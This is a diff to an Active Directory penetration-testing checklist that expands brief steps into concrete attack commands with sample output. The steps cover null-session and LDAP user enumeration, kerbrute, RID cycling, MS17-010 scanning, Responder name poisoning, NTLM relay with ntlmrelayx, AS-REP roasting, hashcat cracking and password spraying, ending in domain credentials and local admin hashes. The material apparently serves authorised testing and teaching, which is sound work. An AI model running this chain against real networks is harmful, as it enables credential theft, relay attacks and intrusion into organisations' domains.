@@ -167,41 +167,121 @@ nmap -p- -sV -sC -oA ad_full <target>
 {% step %}
 #### SMB NULL Session
 
-Attempt to abuse an SMB NULL session against the domain controller.
+Attempt an unauthenticated SMB NULL session against the DC to enumerate users with [rpcclient.md](../toolbox/tooling/information-gathering/service-enumeration/rpcclient.md "mention") or [enum4linux.md](../toolbox/tooling/information-gathering/linux-enumeration/enum4linux.md "mention").
 
-1. rcpclient or enum4linux to grab users.
+```bash
+rpcclient -U "" -N <dc-ip> -c enumdomusers
+```
+
+```bash
+enum4linux-ng -A <dc-ip>
+```
+
+<mark style="color:$primary;">**What to look for:**</mark> whether the NULL session is accepted at all, then the returned usernames. Flag **service accounts** (`svc_`, `sql`, `backup`) and anything privileged-sounding.
+
+```
+user:[Administrator] rid:[0x1f4]
+user:[svc_sql]       rid:[0x450]
+user:[jdoe]          rid:[0x451]
+```
+
+<mark style="color:$primary;">**What it means:**</mark> NULL session allowed = a free user list with no credentials. `NT_STATUS_ACCESS_DENIED` instead means it's locked down - move to LDAP/Kerbrute.
+
+<mark style="color:$primary;">**Next:**</mark> save usernames to `users.txt` - they feed [as-rep-roasting.md](../field-manual/exploitation/initial-access/as-rep-roasting.md "mention"), password spraying, and later, [kerberoasting](../field-manual/post-exploitation/privilege-escalation-1/kerberoasting/ "mention").
+
+* [ ] Complete
 {% endstep %}
 
 {% step %}
 #### LDAP Anonymous Authentication
 
-Attempt to abuse an anonymous LDAP search against the domain controller.
+Attempt an anonymous LDAP search against the DC with ldapsearch or windapsearch. See [ldap.md](../field-manual/exploitation/attacking-services/ldap.md "mention").
 
-1. ldapsearch or windapsearch to grab users.
+{% code overflow="wrap" %}
+```bash
+ldapsearch -x -H ldap://<dc-ip> -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName
+```
+{% endcode %}
+
+<mark style="color:$primary;">**What to look for:**</mark> whether the anonymous bind succeeds, then `sAMAccountName` values. Also scan `description` fields - admins sometimes store passwords there.
+
+```
+sAMAccountName: jdoe
+sAMAccountName: svc_backup
+description: Service acct - TempPass2023!
+```
+
+<mark style="color:$primary;">**What it means:**</mark> a successful bind without creds is another free user list (and occasionally free credentials in description fields). `Operations error` = anonymous bind disabled.
+
+<mark style="color:$primary;">**Next:**</mark> merge any new users into `users.txt`; test any leaked passwords immediately with `nxc smb`.
+
+* [ ] Complete
 {% endstep %}
 
 {% step %}
-#### ASREP-Roasting
+#### Kerberute User Enumeration
 
-Check for users that do not require Kerberos pre-auth (ASREP-Roasting) to get password hash.
+Use `kerbrute` with a username wordlist to validate accounts against the DC. It's quiet - valid/invalid is distinguished without generating failed-logon (4625) events.
+
+```bash
+kerbrute userenum -d domain.local --dc <dc-ip> usernames.txt
+```
+
+<mark style="color:$primary;">**What to look for:**</mark> `VALID USERNAME` lines, and the bonus `has no pre auth required` - Kerbrute hands you the AS-REP hash on the spot.
+
+```
+[+] VALID USERNAME:  jdoe@domain.local
+[+] svc_backup has no pre auth required. Dumping hash:
+    $krb5asrep$23$svc_backup@DOMAIN.LOCAL:a1b2...
+```
+
+<mark style="color:$primary;">**Next:**</mark> validated users > `users.txt` for spraying; any AS-REP hash > crack it (`hashcat -m 18200`) > _User Foothold_.
+
+* [ ] Complete
 {% endstep %}
 
 {% step %}
-#### Kerbrute
+#### Impacket lookupsid
 
-Use Kerbrute and wordlists to brute force usernames against DC.
+Use [impacket](../toolbox/tooling/post-exploitation/impacket/ "mention")'s `lookupsid.py` to RID-cycle the domain and recover users (works via NULL session, better with any creds).
+
+```bash
+impacket-lookupsid anonymous@<dc-ip>
+```
+
+<mark style="color:$primary;">**What to look for:**</mark> the domain SID and the RID-to-name mappings; `SidTypeUser` entries are accounts.
+
+```
+500: DOMAIN\Administrator (SidTypeUser)
+1104: DOMAIN\svc_sql (SidTypeUser)
+1105: DOMAIN\jdoe (SidTypeUser)
+```
+
+<mark style="color:$primary;">**Next:**</mark> this often reveals users the other methods missed - merge into `users.txt`.
+
+* [ ] Complete
 {% endstep %}
 
 {% step %}
-#### Impacket
+#### Vulnerability Check for SYSTEM-level RCE
 
-Use Impackets lookupsid.py to discover users (works better with creds)
-{% endstep %}
+On each discovered host, check for unauthenticated bugs that grant SYSTEM directly - the fastest possible foothold.
 
-{% step %}
-#### Enum
+```bash
+nmap -p445 --script smb-vuln-ms17-010 <target>
+nxc smb 10.10.10.0/24 -u '' -p '' | grep -i signing   # context for relay
+```
 
-Look for systems that can be exploited to gain SYSTEM level access.
+<mark style="color:$primary;">**What to look for:**</mark> `VULNERABLE` in the script output (MS17-010/EternalBlue); on the DC, test Zerologon separately.
+
+```
+| smb-vuln-ms17-010:
+|   State: VULNERABLE (MS17-010)
+```
+
+<mark style="color:$primary;">**Next:**</mark> a VULNERABLE host is a direct SYSTEM shell - exploit it for an immediate foothold before grinding credentials.
+
+* [ ] Complete
 {% endstep %}
 {% endstepper %}
 
@@ -209,20 +289,104 @@ Look for systems that can be exploited to gain SYSTEM level access.
 
 {% stepper %}
 {% step %}
-#### Responder Analysis
+#### Responder / Inveigh Capture
 
-Use Responder/Inveigh on network interface to listen for NTLM users and hashes.
+Run [responder.md](../toolbox/tooling/sniffing-and-spoofing/responder.md "mention") (Linux) or [inveigh.md](../toolbox/tooling/sniffing-and-spoofing/inveigh.md "mention") (Windows) in active mode to poison name resolution and capture NetNTLMv2 hashes.
 
-1. Attempt to crack hashes.
+```bash
+sudo responder -I eth0
+```
+
+<mark style="color:$primary;">**What to look for:**</mark> `[SMB] NTLMv2-SSP Hash` capture lines. Each is a crackable hash for the account that tried to authenticate. Grab the **whole** line.
+
+```
+[SMB] NTLMv2-SSP Client   : 10.10.10.52
+[SMB] NTLMv2-SSP Username : DOMAIN\jdoe
+[SMB] NTLMv2-SSP Hash     : jdoe::DOMAIN:1122334455...:A1B2...
+```
+
+<mark style="color:$primary;">**What it means:**</mark> we've captured an authentication from a real user - if their password is weak we'll crack it to plaintext.
+
+<mark style="color:$primary;">**Next:**</mark> save the full hash to a file and crack it:
+
+```bash
+hashcat -m 5600 netntlmv2.hash /usr/share/wordlists/rockyou.txt
+```
+
+If it won't crack and the target host lacks SMB signing, relay it instead > next step.
+
+* [ ] Complete
+{% endstep %}
+
+{% step %}
+#### NTLM Relay (if SMB signing disabled)
+
+If a captured/coerced auth won't crack, relay it to a host that doesn't require SMB signing. See ntlm-relay-and-coercion-attacks.
+
+```bash
+ntlmrelayx.py -tf relay.txt -smb2support
+```
+
+<mark style="color:$primary;">**What to look for:**</mark> `SUCCEED` authentication lines, then dumped SAM hashes or a session on the relayed target.
+
+```
+[*] Authenticating against smb://10.10.10.60 as DOMAIN\jdoe SUCCEED
+[*] Dumping local SAM hashes
+Administrator:500:aad3b...:31d6cfe0d16ae931...:::
+```
+
+<mark style="color:$primary;">**Next:**</mark> use the dumped local admin hash to pass-the-hash to other hosts.
+
+* [ ] Complete
+{% endstep %}
+
+{% step %}
+#### AS-REP Roasting
+
+For any user with pre-auth disabled, request the AS-REP and crack it offline. See [as-rep-roasting.md](../field-manual/exploitation/initial-access/as-rep-roasting.md "mention").
+
+{% code overflow="wrap" %}
+```bash
+impacket-GetNPUsers domain.local/ -dc-ip <dc-ip> -usersfile users.txt -no-pass -format hashcat
+```
+{% endcode %}
+
+<mark style="color:$primary;">**What to look for:**</mark> `$krb5asrep$` hashes returned for roastable users. No output = no pre-auth-disabled accounts.
+
+```
+$krb5asrep$23$svc_backup@DOMAIN.LOCAL:f4c1...$9a2b...
+```
+
+<mark style="color:$primary;">**Next:**</mark> crack and, on success, you have your first valid credential set:
+
+```bash
+hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
+```
+
+* [ ] Complete
 {% endstep %}
 
 {% step %}
 #### Password Spray
 
-Attempt password spray on users identified during user identification.
+Gather the password policy first, then spray the user list with netexec. See [password-policy.md](../field-manual/intelligence/windows-domain-enumeration/password-policy.md "mention").
 
-1. attempt to gather password policy for organisation.
-2. password spray using common passwords.
+```bash
+nxc smb <dc-ip> -u users.txt -p 'Season2025!' --continue-on-success
+```
+
+<mark style="color:$primary;">**What to look for:**</mark> `[+]` = valid credential; `(Pwn3d!)` = that account is **local admin** on the host; `[-]` = invalid.
+
+```
+SMB  10.10.10.5  445  DC01  [-] domain.local\jdoe:Season2025!
+SMB  10.10.10.5  445  DC01  [+] domain.local\svc_sql:Season2025! (Pwn3d!)
+```
+
+<mark style="color:$primary;">**What it means:**</mark> you now hold a valid domain credential - and if `(Pwn3d!)`, administrative access to at least one host.
+
+<mark style="color:$primary;">**Next:**</mark> move to _Credentialed Enumeration_ with the new creds. _Respect the lockout threshold - one password per user per window._
+
+* [ ] Complete
 {% endstep %}
 {% endstepper %}
 
